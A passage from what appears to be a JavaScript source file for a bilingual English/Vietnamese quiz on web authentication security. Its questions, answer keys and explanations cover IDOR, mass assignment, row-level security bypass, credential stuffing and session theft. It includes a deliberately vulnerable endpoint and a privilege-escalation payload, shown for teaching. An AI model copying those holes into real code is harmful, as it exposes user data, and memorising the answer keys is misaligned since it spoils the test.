            'The signature proves the provider issued the token; it proves nothing about whether the provider ever checked the address inside it. Providers differ enormously — Google verifies, GitHub distinguishes verified from unverified addresses, and a long tail of smaller providers let a user type anything into a profile field. So an attacker opens an account at the laxest provider you accept, sets their profile email to your administrator\'s address, and clicks "sign in with that provider". Two rules follow. First, refuse any token whose <code>email_verified</code> is not exactly <code>true</code> — and note that some providers return the string <code>"true"</code> rather than the boolean, which a strict comparison correctly rejects and a loose one dangerously accepts. Second, stop keying accounts on the address at all: the durable identity is the pair <code>(provider, sub)</code>, because <code>sub</code> is stable for the life of that provider account while addresses get renamed, reassigned to a new employee, or sold with a domain. The pair matters because <code>sub</code> is only unique within one provider. A verified address may still <em>link</em> accounts, but as a step in a flow rather than as a login: if the existing account has a password or a passkey, make the current owner prove it before linking. Option 3 invents a scope, and option 4 names a different attack that <code>nonce</code> already covers.',
            'Chữ ký chứng minh nhà cung cấp đã phát hành cái token; nó không chứng minh gì về việc nhà cung cấp có bao giờ kiểm cái địa chỉ nằm bên trong hay không. Các nhà cung cấp khác nhau rất xa — Google có xác minh, GitHub phân biệt địa chỉ đã xác minh với chưa xác minh, và một cái đuôi dài các nhà cung cấp nhỏ cho phép người dùng gõ bất cứ gì vào một ô hồ sơ. Thế là kẻ tấn công mở một tài khoản ở nhà cung cấp dễ dãi nhất mà bạn chấp nhận, đặt email hồ sơ thành địa chỉ của quản trị viên của bạn, rồi bấm "đăng nhập bằng nhà cung cấp đó". Hai luật rút ra. Một, từ chối mọi token có <code>email_verified</code> không đúng bằng <code>true</code> — và để ý rằng vài nhà cung cấp trả về chuỗi <code>"true"</code> chứ không phải giá trị boolean, thứ mà một phép so nghiêm ngặt từ chối đúng còn một phép so lỏng lẻo chấp nhận một cách nguy hiểm. Hai, thôi hẳn việc đánh khoá tài khoản theo địa chỉ: danh tính bền vững là cặp <code>(provider, sub)</code>, vì <code>sub</code> ổn định suốt vòng đời tài khoản ở nhà cung cấp đó trong khi các địa chỉ thì bị đổi tên, bị giao lại cho nhân viên mới, hoặc bán kèm một tên miền. Phải là CẶP vì <code>sub</code> chỉ duy nhất bên trong MỘT nhà cung cấp. Một địa chỉ đã xác minh vẫn có thể dùng để NỐI tài khoản, nhưng như một bước trong một luồng chứ không phải như một lượt đăng nhập: nếu tài khoản đang có đã có mật khẩu hay một passkey thì hãy bắt chủ nhân hiện tại chứng minh trước khi nối. Phương án 3 bịa ra một scope, còn phương án 4 gọi tên một cú tấn công khác mà <code>nonce</code> đã phủ rồi.',
          ),
        }),

        /* ── Chương 9 — mô hình phân quyền (4 câu) ──────────────────────── */

        // q38 · đáp án 2
        mcq({
          prompt: B(
            'An endpoint is authenticated and still leaks every user\'s invoices:' +
            code("app.get('/api/invoices/:id', requireAuth, async (req, res) => {\n  const invoice = await prisma.invoice.findUnique({ where: { id: req.params.id } });\n  res.json(invoice);\n});") +
            'Which fix is correct, and which status code should the miss return?',
            'Một endpoint đã có xác thực mà vẫn rò hoá đơn của mọi người dùng:' +
            code("app.get('/api/invoices/:id', requireAuth, async (req, res) => {\n  const invoice = await prisma.invoice.findUnique({ where: { id: req.params.id } });\n  res.json(invoice);\n});") +
            'Cách sửa nào là đúng, và khi không khớp thì nên trả mã trạng thái nào?',
          ),
          options: [
            B(
              'Switch the ids to UUIDs so they cannot be enumerated, and return 403 when a caller asks for one that is not theirs',
              'Đổi id sang UUID để không dò tuần tự được, và trả về 403 khi người gọi hỏi một cái không phải của họ',
            ),
            B(
              'Add a role check in the middleware so only users with the invoice-read permission reach the handler, and return 403 for everyone else',
              'Thêm một phép kiểm vai trò vào middleware để chỉ những người có quyền đọc hoá đơn mới tới được handler, và trả về 403 cho tất cả những người còn lại',
            ),
            B(
              'Put the ownership condition inside the query — ' + c('findFirst({ where: { id, userId: req.user.id } })') + ' — and answer 404 on a miss, because 403 confirms the record exists and turns the endpoint into an enumeration oracle',
              'Đặt điều kiện sở hữu vào BÊN TRONG câu truy vấn — ' + c('findFirst({ where: { id, userId: req.user.id } })') + ' — và trả về 404 khi không khớp, vì 403 xác nhận bản ghi đó có tồn tại và biến endpoint thành một cỗ máy dò danh sách',
            ),
            B(
              'Load the invoice and then compare ' + c('invoice.userId') + ' with the caller in an ' + c('if') + ' after the query, returning 403 when they differ, which keeps the authorization logic visible in the handler',
              'Nạp hoá đơn lên rồi so ' + c('invoice.userId') + ' với người gọi trong một lệnh ' + c('if') + ' đặt SAU câu truy vấn, trả về 403 khi chúng khác nhau, cách này giữ cho logic phân quyền hiện rõ trong handler',
            ),
          ],
          correct: 2,
          explanation: EX(
            'This is the most common web vulnerability there is, and it is closed by moving a condition. A query that cannot return another user\'s row is correct by construction; a check performed afterwards is correct today and one careless refactor away from being deleted, and it is absent entirely from the background job, the CSV export and the GraphQL resolver that touch the same table. So option 4 works and is the weaker shape — put the condition where the data is. The status code is the second half of the answer: 403 says "that record exists and is not yours", which lets an attacker walk the id space and learn exactly which invoices exist and how many customers you have. 404 says nothing. Option 1 names a mitigation that is often mistaken for a control — unguessable identifiers raise the cost of finding a target and do nothing once one is known, and ids leak through shared links, screenshots and support tickets anyway. Option 2 confuses the two gates: a middleware knows the route, not the row, so it can answer "may this person read invoices in general" and can never answer "may they read <em>this</em> invoice".',
            'Đây là lỗ hổng web phổ biến nhất hiện có, và nó được đóng lại bằng cách DỜI một mệnh đề. Một câu truy vấn không thể trả về dòng của người khác thì đúng ngay từ cấu tạo; một phép kiểm làm sau đó thì hôm nay đúng, và chỉ cách một lần tái cấu trúc bất cẩn là bị xoá mất, mà nó lại vắng mặt hoàn toàn khỏi cái tác vụ nền, cái bản xuất CSV và cái resolver GraphQL cùng đụng vào bảng đó. Nên phương án 4 chạy được nhưng là hình dạng yếu hơn — hãy đặt điều kiện ở chỗ có dữ liệu. Mã trạng thái là nửa còn lại của câu trả lời: 403 nói "bản ghi đó có tồn tại và nó không phải của bạn", và điều đó cho phép kẻ tấn công đi dọc không gian id để biết chính xác những hoá đơn nào tồn tại và bạn có bao nhiêu khách hàng. 404 thì không nói gì cả. Phương án 1 gọi tên một biện pháp giảm nhẹ hay bị nhầm thành một biện pháp kiểm soát — định danh không đoán được thì làm tăng chi phí TÌM một mục tiêu và chẳng làm gì được khi mục tiêu đã lộ, mà dù sao id vẫn rò ra qua các đường dẫn chia sẻ, ảnh chụp màn hình và phiếu hỗ trợ. Phương án 2 lẫn hai cái cổng: một middleware biết TUYẾN chứ không biết DÒNG, nên nó trả lời được "người này có được đọc hoá đơn nói chung không" và không bao giờ trả lời được "họ có được đọc CÁI hoá đơn NÀY không".',
          ),
        }),

        // q39 · đáp án 1
        mcq({
          prompt: B(
            'A codebase checks ' + c("if (user.role === 'admin' || user.role === 'moderator')") + ' in forty places. What is the concrete cost, and what replaces it?',
            'Một kho mã kiểm ' + c("if (user.role === 'admin' || user.role === 'moderator')") + ' ở bốn mươi chỗ. Cái giá cụ thể là gì, và thứ gì thay thế nó?',
          ),
          options: [
            B(
              'The cost is performance, since each check loads the role from the database; caching the role on the session removes it without changing the shape of the code',
              'Cái giá là hiệu năng, vì mỗi phép kiểm lại nạp vai trò từ cơ sở dữ liệu; cache vai trò vào phiên là gỡ được nó mà không phải đổi hình dạng của mã',
            ),
            B(
              'Adding a role, or changing what one may do, means editing forty call sites and hoping none was missed. Check a <em>permission</em> instead, so roles become data a non-engineer can change without a deploy',
              'Thêm một vai trò, hoặc đổi việc một vai trò được làm gì, nghĩa là phải sửa bốn mươi chỗ gọi và cầu cho không sót cái nào. Hãy kiểm một QUYỀN thay vì vai trò, để các vai trò trở thành dữ liệu mà một người không phải lập trình viên cũng đổi được, không cần deploy',
            ),
            B(
              'The cost is that role names are user-visible strings, so renaming a role in the interface silently breaks every check; storing role ids rather than names fixes it',
              'Cái giá là tên vai trò là những chuỗi người dùng nhìn thấy, nên đổi tên một vai trò trên giao diện sẽ âm thầm làm hỏng mọi phép kiểm; lưu id vai trò thay vì tên là sửa được',
            ),
            B(
              'There is no real cost at this size: permission tables are worth introducing only past a few hundred endpoints, and forty explicit checks are easier to audit than an indirection',
              'Ở quy mô này thì không có cái giá thật nào: bảng quyền chỉ đáng đưa vào khi đã vượt vài trăm endpoint, và bốn mươi phép kiểm tường minh thì dễ rà soát hơn một lớp gián tiếp',
            ),
          ],
          correct: 1,
          explanation: EX(
            'Role names in application code recreate every problem roles were introduced to solve. The progression is familiar: one boolean is reasonable in week one; by month six there are six booleans, which is sixty-four possible combinations of which the product intends to support four, and the other sixty are reachable through the admin interface and have never been tested. Naming the combinations as roles fixes that, and then checking the role names in code moves the coupling rather than removing it. The stable arrangement is that code asks about a permission — <code>invoice:read</code>, <code>post:delete</code> — and a table maps roles to permissions. Adding a role becomes a row, and changing what a role may do becomes a row, neither of which is a deploy. Two practices keep it honest: name permissions <code>resource:action</code> so wildcards mean something later, and generate the permission list from a type in code so a typo is a compile error rather than a silent deny-all in production. One legitimate exception exists — a hard-coded superuser check protecting the permission system itself from locking everybody out. Option 4 is the argument that produces the forty call sites in the first place; the tell that you have waited too long is a role whose name contains an identifier, such as <code>editor_of_project_42</code>, which means the model has run out and you actually need relationships.',
            'Tên vai trò nằm trong mã ứng dụng tái tạo lại đúng mọi vấn đề mà vai trò được đưa vào để giải quyết. Diễn tiến thì quen thuộc: một biến đúng-sai là hợp lý ở tuần đầu; tới tháng thứ sáu thì có sáu biến, tức sáu mươi tư tổ hợp mà sản phẩm chỉ định hỗ trợ bốn, còn sáu mươi cái kia thì với tới được qua giao diện quản trị và chưa từng được kiểm thử. Đặt tên cho các tổ hợp thành vai trò là sửa được điều đó, rồi kiểm TÊN VAI TRÒ trong mã thì chỉ dời chỗ ràng buộc chứ không gỡ bỏ nó. Cách sắp xếp ổn định là mã hỏi về một QUYỀN — <code>invoice:read</code>, <code>post:delete</code> — và một cái bảng ánh xạ vai trò sang quyền. Thêm một vai trò trở thành thêm một dòng, và đổi việc một vai trò được làm gì cũng là một dòng, chẳng cái nào là một lần deploy. Hai thói quen giữ cho nó thật thà: đặt tên quyền theo dạng <code>tàinguyên:hànhđộng</code> để về sau các ký tự đại diện mới có nghĩa, và sinh danh sách quyền từ một kiểu dữ liệu trong mã để một cú gõ nhầm là lỗi biên dịch chứ không phải một lệnh từ-chối-tất-cả im lặng trên production. Có đúng một ngoại lệ chính đáng — một phép kiểm siêu người dùng viết cứng để bảo vệ chính hệ thống phân quyền khỏi việc khoá tất cả mọi người ra ngoài. Phương án 4 chính là lập luận đã sinh ra bốn mươi chỗ gọi kia ngay từ đầu; dấu hiệu cho biết bạn đã chờ quá lâu là một vai trò mà TÊN của nó chứa một định danh, kiểu <code>editor_of_project_42</code>, nghĩa là mô hình đã hết đường và thứ bạn thật sự cần là quan hệ.',
          ),
        }),

        // q40 · đáp án 3
        mcq({
          prompt: B(
            'A multi-tenant service enables PostgreSQL row-level security, writes a correct policy on ' + c('tenant_id') + ', and sets the session variable on every request. Cross-tenant queries still return rows. What is the most likely cause?',
            'Một dịch vụ nhiều tenant bật row-level security của PostgreSQL, viết một chính sách đúng trên ' + c('tenant_id') + ', và đặt biến phiên ở mọi request. Truy vấn xuyên tenant vẫn trả về dữ liệu. Nguyên nhân khả dĩ nhất là gì?',
          ),
          options: [
            B(
              'The policy is missing a <code>WITH CHECK</code> clause, so it filters reads but not writes, and the rows being returned were written by another tenant through an unfiltered insert',
              'Chính sách thiếu mệnh đề <code>WITH CHECK</code>, nên nó lọc lượt đọc mà không lọc lượt ghi, và những dòng đang trả về là do một tenant khác ghi vào qua một lệnh chèn không bị lọc',
            ),
            B(
              'Row-level security applies only to tables in the default schema, and the tenant-scoped tables were created in a named schema where the policy is silently ignored',
              'Row-level security chỉ áp cho các bảng trong schema mặc định, còn các bảng có phạm vi tenant lại được tạo trong một schema có tên nên chính sách bị bỏ qua trong im lặng',
            ),
            B(
              'The session variable is being set with <code>SET LOCAL</code>, which is scoped to a transaction, so it is empty for every query issued outside one and the policy matches everything',
              'Biến phiên đang được đặt bằng <code>SET LOCAL</code>, thứ chỉ có phạm vi trong một giao dịch, nên nó rỗng với mọi truy vấn phát ra ngoài giao dịch và chính sách khớp mọi thứ',
            ),
            B(
              'The application connects as the table owner or as a superuser: an owner bypasses its own policies unless <code>FORCE ROW LEVEL SECURITY</code> is set, and a superuser bypasses them unconditionally, which <code>FORCE</code> does not change',
              'Ứng dụng kết nối bằng chính chủ sở hữu bảng hoặc bằng một siêu người dùng: chủ sở hữu vòng qua chính sách của chính mình trừ khi có <code>FORCE ROW LEVEL SECURITY</code>, còn siêu người dùng thì vòng qua vô điều kiện, và <code>FORCE</code> không đổi được điều đó',
            ),
          ],
          correct: 3,
          explanation: EX(
            'The default project setup walks into both exemptions at once. Migrations are run as one role, the application connects with the same connection string, and that role is usually both the owner of the tables and a superuser. So row-level security is enabled, the policy is written correctly, and nothing is enforced — the most convincing kind of failure, because every artefact you would inspect looks right. The fix is organisational rather than clever: run migrations as one role and the application as a different one that is neither owner nor superuser and holds only the four data-manipulation grants, and add <code>FORCE ROW LEVEL SECURITY</code> so ownership alone is not a bypass. Then verify by connecting as the application role with the setting unset and asserting that every tenant-scoped table returns zero rows — that assertion belongs in CI, because it is the one check that proves the layer is live. Option 3 inverts a rule worth knowing in the other direction: <code>SET LOCAL</code> is exactly right, because a plain <code>SET</code> persists on a pooled connection and leaks into whichever request borrows it next, which is a tenant leak created by the defence. Option 1 names a real omission that affects writes rather than reads. And remember what sits above this layer: the tenant must come from the session, never from a query parameter or header, and a test suite with one tenant cannot detect any of this, because a filtered and an unfiltered result are identical.',
            'Cấu hình mặc định của một dự án bước thẳng vào cả hai chỗ miễn trừ cùng lúc. Migration chạy bằng một vai trò, ứng dụng kết nối bằng đúng chuỗi kết nối đó, và vai trò ấy thường vừa là chủ sở hữu các bảng vừa là siêu người dùng. Thế là row-level security đang bật, chính sách viết đúng, và không có gì được cưỡng chế — kiểu hỏng thuyết phục nhất, vì mọi hiện vật bạn định soi đều trông đúng cả. Cách sửa mang tính tổ chức chứ không cần khôn khéo: chạy migration bằng một vai trò và cho ứng dụng chạy bằng một vai trò khác, không phải chủ sở hữu và không phải siêu người dùng, chỉ được cấp bốn quyền thao tác dữ liệu, và thêm <code>FORCE ROW LEVEL SECURITY</code> để riêng quyền sở hữu không còn là một đường vòng. Rồi kiểm chứng bằng cách kết nối bằng vai trò ứng dụng với biến CHƯA đặt và khẳng định rằng mọi bảng có phạm vi tenant đều trả về không dòng nào — phép khẳng định đó thuộc về CI, vì nó là phép kiểm duy nhất chứng minh cái tầng này còn sống. Phương án 3 lật ngược một luật đáng biết theo chiều kia: <code>SET LOCAL</code> mới đúng, vì một lệnh <code>SET</code> thường sẽ dai dẳng trên một kết nối gộp và rò sang bất cứ request nào mượn nó tiếp theo, tức là một vụ rò tenant do chính biện pháp phòng thủ gây ra. Phương án 1 gọi tên một chỗ thiếu có thật nhưng nó ảnh hưởng tới lượt GHI chứ không phải lượt ĐỌC. Và nhớ thứ nằm phía trên tầng này: tenant phải đến TỪ PHIÊN, không bao giờ từ một tham số truy vấn hay một header, và một bộ kiểm thử chỉ có một tenant thì không phát hiện được gì trong số này, vì kết quả có lọc và không lọc là y hệt nhau.',
          ),
        }),

        // q41 · đáp án 0
        mcq({
          prompt: B(
            'A profile endpoint runs ' + c('await prisma.user.update({ where: { id: user.id }, data: req.body })') + '. A caller sends ' + c('{ "name": "An", "role": "admin" }') + ' and becomes an administrator. Every authorization rule in the system was enforced correctly. What is this, and what is the fix?',
            'Một endpoint hồ sơ chạy ' + c('await prisma.user.update({ where: { id: user.id }, data: req.body })') + '. Một người gọi gửi ' + c('{ "name": "An", "role": "admin" }') + ' và trở thành quản trị viên. Mọi luật phân quyền trong hệ thống đều đã được cưỡng chế đúng. Đây là gì, và cách sửa là gì?',
          ),
          options: [
            B(
              'Mass assignment: the client writes any column the model has, on an operation it was genuinely allowed to perform. Destructure an explicit allow-list, validated by a schema that errors on unknown keys rather than ignoring them',
              'Gán hàng loạt: client ghi được vào mọi cột mà model có, trên một thao tác mà nó THẬT SỰ được phép làm. Hãy bóc tách một danh sách trắng tường minh, kiểm bằng một lược đồ BÁO LỖI với các khoá lạ thay vì bỏ qua chúng',
            ),
            B(
              'An IDOR, because the caller reached a row they should not be able to write; the fix is to add the ownership condition to the <code>where</code> clause',
              'Một lỗi IDOR, vì người gọi với tới được một dòng mà lẽ ra họ không ghi vào được; cách sửa là thêm điều kiện sở hữu vào mệnh đề <code>where</code>',
            ),
            B(
              'Privilege escalation through a missing middleware: the route needed a <code>requirePermission(\'user:update\')</code> guard, which would have rejected the request before it reached the handler',
              'Leo thang đặc quyền do thiếu middleware: tuyến này cần một chốt <code>requirePermission(\'user:update\')</code>, thứ lẽ ra đã từ chối request trước khi nó tới handler',
            ),
            B(
              'A schema design fault: <code>role</code> should never live on the user table, and moving it to a join table removes the possibility entirely',
              'Một lỗi thiết kế lược đồ: <code>role</code> không bao giờ nên nằm trên bảng người dùng, và chuyển nó sang một bảng nối là gỡ bỏ hẳn khả năng này',
            ),
          ],
          correct: 0,
          explanation: EX(
            'What makes this class hard to see is that nothing in the authorization layer failed. The caller is authenticated, the row is their own, the operation is one they are entitled to perform, and every check you wrote returned allow. The vulnerability is in the <em>shape of the payload</em>: spreading a request body into an update lets the client choose which columns to write, and the model has more columns than the form does. Option 2 is the tempting misdiagnosis and the reason this bug survives review — the <code>where</code> clause is already correct here, and adding another one changes nothing. Option 3 is the same mistake one layer up: the permission check would pass, because updating your own profile is exactly what this user may do. The fix is to name the fields: destructure them explicitly and validate with a schema configured to reject unknown keys rather than silently drop them, so a new column added next year does not quietly become writable. It is also one of the cheapest things to audit — grep the whole repository for <code>...req.body</code> and <code>data: req.body</code>, and the entire class surfaces in one pass. Option 4 moves the specific column without addressing the mechanism, which would still expose the next sensitive field.',
            'Thứ khiến lớp lỗi này khó thấy là KHÔNG có gì trong tầng phân quyền hỏng cả. Người gọi đã xác thực, cái dòng đó là của chính họ, thao tác đó là thứ họ có quyền làm, và mọi phép kiểm bạn viết đều trả về cho phép. Lỗ hổng nằm ở HÌNH DẠNG CỦA DỮ LIỆU GỬI LÊN: rải phần thân request vào một lệnh cập nhật là để client tự chọn ghi vào cột nào, mà cái model thì có nhiều cột hơn cái biểu mẫu. Phương án 2 là chẩn đoán sai đầy hấp dẫn và là lý do con bọ này sống sót qua các vòng rà soát — mệnh đề <code>where</code> ở đây vốn đã đúng, thêm một cái nữa cũng chẳng đổi gì. Phương án 3 là đúng sai lầm ấy ở một tầng cao hơn: phép kiểm quyền sẽ QUA, vì cập nhật hồ sơ của chính mình đúng là thứ người dùng này được làm. Cách sửa là GỌI TÊN các trường: bóc tách chúng ra tường minh và kiểm bằng một lược đồ được cấu hình để TỪ CHỐI các khoá lạ chứ không lặng lẽ bỏ chúng, để một cột mới thêm vào năm sau không âm thầm trở nên ghi được. Đây cũng là một trong những thứ rẻ nhất để rà soát — grep cả kho mã tìm <code>...req.body</code> và <code>data: req.body</code>, và cả lớp lỗi lộ ra trong một lượt. Phương án 4 dời riêng cái cột đó đi mà không đụng tới cơ chế, nên trường nhạy cảm kế tiếp vẫn sẽ phơi ra.',
          ),
        }),

        /* ── Chương 10 — các cú tấn công theo tần suất thật (3 câu) ─────── */

        // q42 · đáp án 1
        mcq({
          prompt: B(
            'Against a credential-stuffing run using a list of a million breached email and password pairs, per-IP rate limiting changes almost none of the outcome numbers. Why, and what does change them?',
            'Trước một đợt nhồi tín vật dùng danh sách một triệu cặp email cùng mật khẩu rò rỉ, việc giới hạn tần suất theo IP gần như không đổi được con số kết quả nào. Vì sao, và thứ gì thì đổi được?',
          ),
          options: [
            B(
              'Because the attacker\'s requests are spread over hours, so no single address ever exceeds a per-minute threshold; shortening the window to a per-second limit is what catches them',
              'Vì các request của kẻ tấn công trải ra hàng giờ, nên không địa chỉ nào từng vượt ngưỡng tính theo phút; rút cửa sổ xuống mức giới hạn theo giây mới là thứ bắt được chúng',
            ),
            B(
              'Because residential proxy pools give one guess per address across thousands of addresses, so the limiter counts the one thing the attacker rotates cheapest. Checking new passwords against a breach corpus removes most of the input before it reaches the login page, and a second factor blocks automated stuffing outright',
              'Vì các nhóm proxy dân cư cho phép một lượt đoán mỗi địa chỉ trải trên hàng nghìn địa chỉ, nên bộ giới hạn đang đếm đúng cái thứ mà kẻ tấn công xoay vòng rẻ nhất. Đối chiếu mật khẩu mới với một kho dữ liệu rò rỉ gỡ được phần lớn đầu vào TRƯỚC khi nó chạm tới trang đăng nhập, và một yếu tố thứ hai chặn thẳng việc nhồi tự động',
            ),
            B(
              'Because most of the pairs fail anyway, so the limiter is measuring noise; raising the threshold and alerting on the failure count instead is the correct response',
              'Vì phần lớn các cặp dù sao cũng trượt, nên bộ giới hạn đang đo nhiễu; nâng ngưỡng lên và chuyển sang cảnh báo theo SỐ LẦN HỎNG mới là phản ứng đúng',
            ),
            B(
              'Because the limiter runs after authentication, so a correct pair is already through before it is counted; moving the check earlier in the middleware chain resolves it',
              'Vì bộ giới hạn chạy SAU bước xác thực, nên một cặp đúng đã lọt qua trước khi được đếm; dời phép kiểm lên sớm hơn trong chuỗi middleware là giải quyết được',
            ),
          ],
          correct: 1,
          explanation: EX(
            'Stuffing exploits nothing. It works because a substantial fraction of people reuse a breached pair, and it succeeds on a low single-digit percentage of attempts — which, against a list of a million, is thousands of accounts. An IP limit is measuring the resource the attacker buys by the thousand: with a residential proxy pool, each address makes one attempt against one account and never comes close to a threshold. The measured timings make the point on their own — one address at a modest rate needs more than a day to walk a million pairs, a thousand proxies need minutes, and a large botnet finishes before the dashboard refreshes. What moves the numbers is removing the input and removing the payoff. A breach-corpus check at registration and at password change means most of the list no longer matches anything, and a second factor turns every remaining correct pair into a failed login. Counting failures per <em>account</em> helps too, with exponential backoff and a counter cleared by a correct sign-in, so real users never reach the cap. What you must not do is lock the account permanently after N failures: that hands the attacker a tool for locking out a large fraction of your users in an afternoon, which is a worse outcome than the attack it prevents.',
            'Nhồi tín vật không khai thác lỗ hổng nào. Nó ăn được vì một tỉ lệ đáng kể người dùng tái sử dụng một cặp đã rò rỉ, và nó thành công trên một tỉ lệ vài phần trăm số lượt thử — mà với một danh sách một triệu thì đó là hàng nghìn tài khoản. Một hạn mức theo IP đang đo đúng cái tài nguyên mà kẻ tấn công mua theo lô nghìn: với một nhóm proxy dân cư, mỗi địa chỉ thử đúng một lượt vào đúng một tài khoản và không bao giờ tới gần ngưỡng nào. Các số đo về thời gian tự chúng nói lên điều đó — một địa chỉ với nhịp vừa phải cần hơn một ngày để đi hết một triệu cặp, một nghìn proxy cần vài phút, còn một mạng máy ma lớn thì xong trước khi cái bảng điều khiển kịp làm mới. Thứ dịch chuyển được các con số là GỠ ĐẦU VÀO và GỠ PHẦN THƯỞNG. Một phép đối chiếu với kho dữ liệu rò rỉ ở lúc đăng ký và lúc đổi mật khẩu khiến phần lớn danh sách kia không còn khớp với gì nữa, và một yếu tố thứ hai biến mọi cặp đúng còn lại thành một lượt đăng nhập hỏng. Đếm số lần hỏng theo TÀI KHOẢN cũng giúp được, kèm lùi thời gian theo cấp số nhân và một bộ đếm được xoá bởi một lượt đăng nhập đúng, nên người dùng thật không bao giờ chạm trần. Thứ tuyệt đối đừng làm là khoá vĩnh viễn tài khoản sau N lần hỏng: điều đó trao cho kẻ tấn công một công cụ để khoá một phần lớn người dùng của bạn ra ngoài chỉ trong một buổi chiều, và đó là một kết cục tệ hơn cả cú tấn công mà nó ngăn.',
          ),
        }),

        // q43 · đáp án 3
        mcq({
          prompt: B(
            'A user was phished through a reverse-proxy kit and their session cookie was captured after a successful login with a correct TOTP code. They have now changed their password. What ends the attacker\'s access?',
            'Một người dùng bị lừa qua một bộ công cụ proxy ngược và cookie phiên của họ bị chộp SAU khi đã đăng nhập thành công kèm một mã TOTP đúng. Giờ họ đã đổi mật khẩu. Thứ gì chấm dứt được quyền truy cập của kẻ tấn công?',
          ),
          options: [
            B(
              'The password change already did, because every credential derived from the old password is invalidated when the hash changes',
              'Việc đổi mật khẩu đã chấm dứt rồi, vì mọi tín vật dẫn xuất từ mật khẩu cũ đều mất hiệu lực khi chuỗi băm thay đổi',
            ),
            B(
              'Rotating the TOTP secret, since the stolen session was authorised by a code derived from it and the session inherits that binding',
              'Xoay lại bí mật TOTP, vì cái phiên bị trộm được cấp phép bởi một mã dẫn xuất từ nó và cái phiên thừa hưởng mối ràng buộc đó',
            ),
            B(
              'Nothing, until the cookie expires: a session cookie is opaque to the server, so there is no way to distinguish the attacker\'s copy from the user\'s own',
              'Không gì cả, cho tới khi cookie hết hạn: một cookie phiên là thứ mờ đục với máy chủ, nên không có cách nào phân biệt bản sao của kẻ tấn công với bản của chính người dùng',
            ),
            B(
              'Revocation, and only revocation: the stolen artefact is a session rather than a credential, so it must be ended explicitly — and the delay before it stops working is the access-token lifetime you chose',
              'Thu hồi, và chỉ có thu hồi: hiện vật bị trộm là một PHIÊN chứ không phải một TÍN VẬT, nên nó phải bị chấm dứt một cách tường minh — và độ trễ trước khi nó thôi chạy chính là vòng đời access token mà bạn đã chọn',
            ),
          ],
          correct: 3,
          explanation: EX(
            'The kit does not steal the password. It proxies your genuine login page, so the user sees genuine HTML, genuine TLS on the attacker\'s domain, and genuine error messages; the second-factor prompt is forwarded within seconds and the code works, because six digits carry no information about which site asked for them. What the attacker keeps is the authenticated session cookie you issued after all of that succeeded. Changing the password therefore changes nothing about it — the session was already established and does not reference the password. The only thing that ends it is revocation, which is why every chapter on sessions insists that revocation be a feature you build before you need it. Two practical consequences. Short access-token lifetimes are what make revocation fast: with a stateless token, the gap between revoking and the attacker actually stopping is that lifetime, and fifteen minutes reads very differently from twenty-four hours. And give users a path that says "I think I was phished" and revokes every session immediately, with no support queue in the way. Option 3 is wrong in a way worth naming: a session cookie is opaque to the <em>client</em>, not to you — it maps to a row you can mark revoked. Also note what the padlock proves here: that the connection is encrypted, and nothing more. Every phishing site has valid TLS.',
            'Bộ công cụ đó không trộm mật khẩu. Nó làm proxy cho chính trang đăng nhập thật của bạn, nên người dùng thấy HTML thật, TLS thật trên tên miền của kẻ tấn công, và thông báo lỗi thật; lời nhắc yếu tố thứ hai được chuyển tiếp trong vài giây và cái mã chạy được, vì sáu chữ số không mang thông tin nào về việc trang nào đã hỏi xin chúng. Thứ kẻ tấn công giữ lại là cái cookie phiên ĐÃ XÁC THỰC mà bạn cấp ra sau khi tất cả những bước ấy thành công. Vì thế đổi mật khẩu chẳng thay đổi gì về nó — cái phiên đã được thiết lập rồi và nó không tham chiếu tới mật khẩu. Thứ duy nhất chấm dứt nó là THU HỒI, và đó là lý do mọi chương về phiên đều nhấn mạnh rằng thu hồi phải là một tính năng bạn dựng TRƯỚC khi cần tới nó. Hai hệ quả thực dụng. Vòng đời access token ngắn chính là thứ khiến việc thu hồi diễn ra nhanh: với một token không trạng thái, khoảng cách giữa lúc thu hồi và lúc kẻ tấn công thật sự dừng lại chính là cái vòng đời đó, và mười lăm phút đọc lên khác hẳn hai mươi tư giờ. Và hãy cho người dùng một đường "tôi nghĩ tôi bị lừa" thu hồi mọi phiên ngay lập tức, không có hàng đợi hỗ trợ nào chắn giữa. Phương án 3 sai theo một kiểu đáng gọi tên: một cookie phiên mờ đục với CLIENT chứ không mờ đục với bạn — nó ánh xạ tới một dòng dữ liệu mà bạn đánh dấu thu hồi được. Cũng nhớ luôn cái ổ khoá xanh chứng minh điều gì ở đây: rằng kết nối được mã hoá, và không gì hơn. Mọi trang lừa đảo đều có TLS hợp lệ.',
          ),
        }),

        // q44 · đáp án 2
        mcq({
          prompt: B(
            'Five variants of pre-hijacking exist: federated merge, an unexpired session, a trojan identifier, an unconfirmed pending email change, and a non-verifying provider. One rule closes all five. What is it?',
            'Có năm biến thể của tấn công chiếm-trước: gộp qua nhà cung cấp, một phiên chưa hết hạn, một định danh cài cắm, một thay đổi email đang chờ chưa xác nhận, và một nhà cung cấp không xác minh. Một cái luật đóng được cả năm. Luật đó là gì?',
          ),
          options: [
            B(
              'Never allow registration with an address that has not been verified first, so an attacker cannot create the prior state at all',
              'Đừng bao giờ cho đăng ký bằng một địa chỉ chưa được xác minh trước, để kẻ tấn công không tạo được trạng thái đi trước ấy',
            ),
            B(
              'Delete every account that has not verified its address within thirty days, which removes the attacker\'s dormant registration before the victim arrives',
              'Xoá mọi tài khoản chưa xác minh địa chỉ trong vòng ba mươi ngày, việc đó gỡ bỏ cái đăng ký nằm im của kẻ tấn công trước khi nạn nhân tới',
            ),
            B(
              'A password reset must invalidate everything that existed before it — every session, every pending email change, every factor and provider link attached earlier, and every outstanding token. Treat the reset as a boundary the previous account state does not cross',
              'Một lượt đặt lại mật khẩu phải huỷ hiệu lực MỌI THỨ tồn tại trước nó — mọi phiên, mọi thay đổi email đang chờ, mọi yếu tố và mọi liên kết nhà cung cấp đã gắn từ trước, và mọi token còn treo. Hãy coi lượt đặt lại như một cái ranh giới mà trạng thái tài khoản cũ không vượt qua được',
            ),
            B(
              'Send a notification to the address on every state change, so the real owner sees the attacker\'s activity and can intervene before the account is claimed',
              'Gửi một thông báo tới địa chỉ đó ở mỗi lần trạng thái thay đổi, để chủ nhân thật thấy hoạt động của kẻ tấn công và can thiệp được trước khi tài khoản bị nhận',
            ),
          ],
          correct: 2,
          explanation: EX(
